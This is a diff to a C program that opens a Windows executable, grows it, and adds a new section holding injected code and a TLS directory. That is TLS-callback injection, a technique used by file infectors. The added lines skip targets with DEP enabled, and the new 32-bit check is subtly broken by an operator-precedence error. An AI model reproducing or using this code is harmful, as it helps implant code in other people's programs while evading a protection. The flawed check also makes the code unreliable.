@@ -20,6 +20,8 @@ void main(void)
 		return;
 
 	DWORD dwFileSize = GetFileSize(hFile, 0);
+
+	// assumes section_alignment of 0x1000 
 	dwFileSize += ALIGN_UP(sizeof(Code)+sizeof(IMAGE_TLS_DIRECTORY)+12, 0x1000);
 
 	HANDLE hFileMapping = CreateFileMappingA(hFile, 0, PAGE_READWRITE, 0, dwFileSize, 0);
@@ -30,6 +32,14 @@ void main(void)
 
 	PIMAGE_DOS_HEADER pIDH = (PIMAGE_DOS_HEADER)pExe;
 	PIMAGE_NT_HEADERS pINH = (PIMAGE_NT_HEADERS)((DWORD)pExe + pIDH->e_lfanew);
+
+	// 32 bit
+	if (!pINH->FileHeader.Machine == IMAGE_FILE_MACHINE_I386)
+		return;
+
+	// DEP enabled 
+	if (pINH->OptionalHeader.DllCharacteristics & IMAGE_DLLCHARACTERISTICS_NX_COMPAT)
+		return;
 
 	PIMAGE_SECTION_HEADER pISH = IMAGE_FIRST_SECTION(pINH);
 	PIMAGE_SECTION_HEADER pLastSection = pISH;
@@ -60,7 +70,7 @@ void main(void)
 	pTLSSection->PointerToRawData = pLastSection->PointerToRawData + pLastSection->SizeOfRawData;
 	pTLSSection->Misc.VirtualSize = sizeof(Code)+sizeof(IMAGE_TLS_DIRECTORY)+12;
 	pTLSSection->VirtualAddress = pLastSection->VirtualAddress + pLastSection->Misc.VirtualSize;
-	
+
 	pTLSSection->PointerToRelocations = 0;
 	pTLSSection->PointerToLinenumbers = 0;
 	pTLSSection->NumberOfRelocations = 0;
